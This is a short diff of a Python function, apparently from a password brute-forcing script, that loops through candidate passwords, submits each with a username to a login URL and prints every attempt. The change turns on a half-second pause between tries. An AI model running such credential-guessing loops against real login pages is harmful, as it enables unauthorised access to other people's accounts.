@@ -131,7 +131,7 @@ def Blasting():
 				data['passwd'] = x
 				req = request.Request(url, headers = head)
 				print('Try password: %s for user: %s' % (data['passwd'], data['muser']))
-				#time.sleep(0.5)
+				time.sleep(0.5)
 				try :
 					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))	
 				except error.HTTPError as e:
